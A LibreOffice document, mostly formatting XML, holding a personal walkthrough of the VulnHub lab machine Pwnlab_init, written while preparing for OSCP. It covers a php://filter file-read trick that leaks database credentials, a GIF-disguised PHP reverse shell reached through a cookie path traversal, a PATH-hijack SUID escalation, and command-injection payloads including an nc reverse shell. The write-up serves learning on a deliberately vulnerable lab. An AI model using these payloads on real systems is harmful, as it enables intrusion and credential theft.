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2bcf7" officeooo:paragraph-rsid="0002bcf7"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="001fe04e"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="000383cf" officeooo:paragraph-rsid="00076cf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Mono L" officeooo:rsid="00063aa0" officeooo:paragraph-rsid="00063aa0"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="bold" officeooo:rsid="00063aa0" officeooo:paragraph-rsid="00063aa0" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="bold" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="bold" officeooo:rsid="002194fa" officeooo:paragraph-rsid="002194fa" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="bold" officeooo:rsid="002b3120" officeooo:paragraph-rsid="002b3120" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="00063aa0" officeooo:paragraph-rsid="00063aa0" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="0034364f" officeooo:paragraph-rsid="0034364f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="0034ff8b" officeooo:paragraph-rsid="0037857d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="0034ff8b" officeooo:paragraph-rsid="00063aa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Nimbus Mono L" fo:font-size="36pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6" style:font-size-asian="36pt" style:font-weight-asian="bold" style:font-size-complex="3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Nimbus Mono L" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="002194fa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Nimbus Mono L" officeooo:rsid="0034364f" officeooo:paragraph-rsid="0034364f"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0034ff8b" officeooo:paragraph-rsid="0034ff8b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="0034ff8b" officeooo:paragraph-rsid="0034ff8b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="004073cf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="00063aa0" officeooo:paragraph-rsid="00063aa0" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="004073cf" officeooo:paragraph-rsid="004073cf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="004575a5" officeooo:paragraph-rsid="004575a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Nimbus Mono L" fo:font-weight="normal" officeooo:rsid="004b2658" officeooo:paragraph-rsid="004b2658" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b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font-name="Nimbus Mono L" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="004073cf" officeooo:paragraph-rsid="004073cf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font-name="Nimbus Mono L" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0041575d" officeooo:paragraph-rsid="0041575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style:font-name="Nimbus Mono L" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0042a2fe" officeooo:paragraph-rsid="0042a2fe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Nimbus Mono L" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0042a2fe" officeooo:paragraph-rsid="0042b835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Nimbus Mono L" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b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font-name="Nimbus Mono L" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="004073cf" officeooo:paragraph-rsid="004073c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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0041575d" officeooo:paragraph-rsid="0041575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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0042a2fe" officeooo:paragraph-rsid="0042a2f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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0042b835" officeooo:paragraph-rsid="0042b83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Nimbus Mono L" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0049a9ac" officeooo:paragraph-rsid="0049a9ac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Nimbus Mono L" fo:font-weight="bold" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="0002e2a6" officeooo:paragraph-rsid="0002e2a6"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="003f104b" officeooo:paragraph-rsid="003f104b"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="004575a5" officeooo:paragraph-rsid="004575a5"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Nimbus Mono L" officeooo:rsid="0046313c" officeooo:paragraph-rsid="0046313c"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0002bcf7"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="0004e16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e2a6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aa0c8"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="0012d6ec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939d0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="0034364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7857d"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="004575a5"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="0036922e"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties officeooo:rsid="0037857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officeooo:rsid="004073cf"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="0042b835"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="004073cf" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="00455ed0"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="0048312e"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="004b2658"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="004dc9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START DATE</text:span>: <text:span text:style-name="T10">11/02/17 <text:s text:c="41"/>END DATE: 13/02/17</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T10">Pwnlab</text:span>_<text:span text:style-name="T10">init</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T8">PRI</text:span><text:span text:style-name="T9">N</text:span><text:span text:style-name="T8">CE</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T10">This was the first machine in my path to OSCP that was rooted seriously after I had a conviction to puruse OSCP. I remembered some steps since i had fiddled around with vulnhub machines before.</text:span></text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P8">STEPS INVOLVED:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P17">1.PHP <text:span text:style-name="T14">source code disclosure trick</text:span></text:p>
      <text:p text:style-name="P17">2.L<text:span text:style-name="T15">ocal </text:span>F<text:span text:style-name="T15">ile </text:span>I<text:span text:style-name="T15">nclusion</text:span></text:p>
      <text:p text:style-name="P17">3.Privilege Escalation</text:p>
      <text:p text:style-name="P44">4.Command Injection</text:p>
      <text:p text:style-name="P45">5.<text:span text:style-name="T23">Changing the environment variables to run local binary instead <text:s text:c="7"/>of main binary in /bin or /usr/bin or whatever.</text:span></text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P10">THINGS TO LOOK FORWARD TO:</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P12">1.Not so well know<text:span text:style-name="T15">n</text:span> trick with php server: that discloses the php source code and renders it to the client in weak base64 encryption <text:s/><text:span text:style-name="T18">by </text:span><text:span text:style-name="T21">php://filter/convert.base64-encode/resource=pagename</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">TOOLS USED:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">1.<text:span text:style-name="T7">nmap</text:span></text:p>
      <text:p text:style-name="P4">2.<text:span text:style-name="T10">mysql</text:span></text:p>
      <text:p text:style-name="P43">3.Burp Suite</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">ELABORATION:</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P14">host discovery:</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P13"><text:span text:style-name="T11">nmap -sn </text:span><text:span text:style-name="T12">-T4 </text:span><text:span text:style-name="T11">192.168.0./</text:span><text:span text:style-name="T12">24</text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P26">nikto -host http://192.168.0.103</text:p>
      <text:p text:style-name="P27">/config.php: PHP Config file may contain database IDs and passwords.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P33">To render the base64 encoded source code of the config.php</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P34">http://192.168.0.103/?page=php://filter/convert.base64-encode/resource=config</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P35">this would give a base64 encrypted strings on decryption of which we have:</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P32"><text:soft-page-break/>&lt;?php</text:p>
      <text:p text:style-name="P32">$server<text:tab/> <text:s/>= "localhost";</text:p>
      <text:p text:style-name="P32">$username = "root";</text:p>
      <text:p text:style-name="P32">$password = "H4u%QJ_H99";</text:p>
      <text:p text:style-name="P32">$database = "Users";</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P35">To have a look as to what is within the database; We login into the database:</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P34">mysql -uroot -pH4u%QJ_H99 -h192.168.0.103 -Dusers</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P27">mysql&gt; show tables;</text:p>
      <text:p text:style-name="P27">+-----------------+</text:p>
      <text:p text:style-name="P27">| Tables_in_Users |</text:p>
      <text:p text:style-name="P27">+-----------------+</text:p>
      <text:p text:style-name="P27">| users <text:s text:c="10"/>|</text:p>
      <text:p text:style-name="P27">+-----------------+</text:p>
      <text:p text:style-name="P27"><text:s text:c="5"/></text:p>
      <text:p text:style-name="P27">mysql&gt; select * from users;</text:p>
      <text:p text:style-name="P27">+------+------------------+</text:p>
      <text:p text:style-name="P27">| user | pass <text:s text:c="12"/>|</text:p>
      <text:p text:style-name="P27">+------+------------------+</text:p>
      <text:p text:style-name="P27">| kent | Sld6WHVCSkpOeQ== |</text:p>
      <text:p text:style-name="P27">| mike | U0lmZHNURW42SQ== |</text:p>
      <text:p text:style-name="P27">| kane | aVN2NVltMkdSbw== |</text:p>
      <text:p text:style-name="P27">+------+------------------+</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P20">We have the login of all the users of pwnlab.</text:p>
      <text:p text:style-name="P20">Login with any of the user to the login page.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P36">On anlaysis of the source code of the index page we find that <text:span text:style-name="T3">lang </text:span>cookie can be used to execute a code... in this case reverse shell</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P23">This is the time for the LFI.</text:p>
      <text:p text:style-name="P23">Download a sciprt from pentest monkey for php reverse shell. </text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">Change the LHOST(192.168.0.108) and LPORT(4444)</text:p>
      <text:p text:style-name="P23">To bypass the file type checking add <text:span text:style-name="T5">GIF98</text:span><text:span text:style-name="T3">(file sign of .gif) </text:span><text:span text:style-name="T16">at the beginning of the file.</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16">Save the file as image.gif and upload to the server.</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16">Uploaded file appear in </text:span><text:span text:style-name="T3">/upload.</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16">Remember the name of the file(reverse shell script) that you just uploaded.</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16">On LHOST listen on the port mentioned in the reverse shell.</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P28">ncat -nlvp 4444</text:p>
      <text:p text:style-name="P28"><text:soft-page-break/></text:p>
      <text:p text:style-name="P37">Intercept the packet by Burp Suite and change the <text:span text:style-name="T5">PHPSESSID </text:span>with <text:span text:style-name="T11">lang=../upload/</text:span><text:span text:style-name="T5">skdjfhsdf7f23ewfdldf.gif</text:span> </text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P37">We have a shell of the victim on the LHOST</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P29">python -c “import pty;pty.spawn(‘/bin/bash’)”</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P37">this gives a bash shell</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P29">su kane</text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17">password is the same as the mysql database</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17">on visiting the users </text:span><text:span text:style-name="T19">home</text:span><text:span text:style-name="T17"> we see a file that says </text:span>msgmike<text:span text:style-name="T17"> this file has SUID set. Owner is mike</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17">On seeing the strings it shows </text:span>cat /home/kane/msgmike<text:span text:style-name="T17"> </text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17">Therefore we make a file named cat.</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T22">e</text:span>cho “/bin/sh” &gt; cat</text:p>
      <text:p text:style-name="P29">chmod 777 cat</text:p>
      <text:p text:style-name="P29">export PATH=.:$PATH</text:p>
      <text:p text:style-name="P29">./msgmike</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P37">and we become <text:span text:style-name="T5">mike</text:span></text:p>
      <text:p text:style-name="P37"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P37">traversing to mikes’ home we see <text:span text:style-name="T5">msg2root.</text:span> It also has root SUID set. On executing it asks for a userinput</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P30">Messasge for the root: whatever;bash -p</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P38">this gives the root access</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P30">cat /root/flag.txt</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P39"><text:span text:style-name="T11">ANO</text:span><text:span text:style-name="T13">T</text:span><text:span text:style-name="T11">HER WAY OF GETTING ROOT</text:span>:</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P39">while you listen on port 1234</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P31">Messasge for the root: whatever;/<text:span text:style-name="T20">bin/nc 192.168.0.108 1234 -e /bin/sh</text:span></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P39">This gives a sh shell on LHOST.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P8"><text:span text:style-name="T6">T</text:span>HINGS LEARNT:</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P24">1.i never knew the way to reveal the source code of the php file.</text:p>
      <text:p text:style-name="P24">2.Command injection was learnt.</text:p>
      <text:p text:style-name="P40"><text:soft-page-break/>3.I never knew changing the PATH variable can execute the local flile with the same name as if running the supposed binary.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P9">ABOUT MACHINE:</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P25"><text:span text:style-name="T3">http://www.vulnhub.com</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">CONCLUSION: <text:span text:style-name="T25">@pwne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4:55:11.304275132</meta:creation-date>
    <dc:date>2017-02-14T13:57:00.705225719</dc:date>
    <meta:editing-duration>PT1H10M37S</meta:editing-duration>
    <meta:editing-cycles>44</meta:editing-cycles>
    <meta:generator>LibreOffice/5.2.4.2$Linux_X86_64 LibreOffice_project/3d5603e1122f0f102b62521720ab13a38a4e0eb0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="88" meta:word-count="563" meta:character-count="3548" meta:non-whitespace-character-count="2985"/>
  </office:meta>
</office:document-meta>
</file>